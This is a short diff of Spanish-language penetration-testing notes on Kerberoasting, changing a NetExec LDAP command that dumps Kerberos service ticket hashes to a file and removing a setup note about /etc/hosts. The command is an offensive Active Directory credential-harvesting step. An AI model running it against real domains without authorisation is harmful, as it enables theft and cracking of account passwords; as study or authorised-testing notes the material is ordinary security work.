@@ -5,10 +5,7 @@ Tags: #AD #Kerberoasting #Parrot #Kali #HashCat
 ## Obtener Hash con CrackMapExec
 
 ```bash 
-❯ nxc ldap IP -u 'user' -p 'Password' --kerberoast output.txt
-
-Nota: 
-	1. Tener la IP con el dominio en '/etc/hosts'
+❯ nxc ldap IP -u 'user' -p 'Password' --kerberoasting output.txt
 ```
 
 ## Crackear el Hash obtenido 
